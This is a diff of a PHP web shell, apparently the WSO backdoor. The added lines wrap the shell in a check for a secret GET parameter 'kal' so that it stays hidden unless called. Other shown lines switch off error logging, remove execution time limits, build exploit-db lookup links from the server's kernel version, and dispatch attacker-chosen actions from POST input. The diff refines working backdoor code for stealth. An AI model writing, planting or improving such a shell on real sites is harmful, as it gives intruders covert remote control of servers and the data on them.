@@ -11,6 +11,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
         exit;
     }
 }
+if(isset($_GET["kal"])){ 
 @ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
@@ -24,12 +25,10 @@ if(get_magic_quotes_gpc()) {
 	$_POST = WSOstripslashes($_POST);
     $_COOKIE = WSOstripslashes($_COOKIE);
 }
-
 function WSOsetcookie($k, $v) {
     $_COOKIE[$k] = $v;
     setcookie($k, $v);
 }
-
 if(strtolower(substr(PHP_OS,0,3)) == "win")
 	$os = 'win';
 else
@@ -185,7 +184,7 @@ function wsoHeader() {
 	$totalSpace = $totalSpace?$totalSpace:1;
 	$release = @php_uname('r');
 	$kernel = @php_uname('s');
-	$explink = 'http://exploit-db.com/search/?action=search&filter_description=';
+	$explink = 'https://exploit-db.com/search/?action=search&filter_description=';
 	if(strpos('Linux', $kernel) !== false)
 		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
 	else
@@ -1403,4 +1402,4 @@ if( empty($_POST['a']) )
 		$_POST['a'] = 'SecInfo';
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
 	call_user_func('action' . $_POST['a']);
-exit;
+exit; }
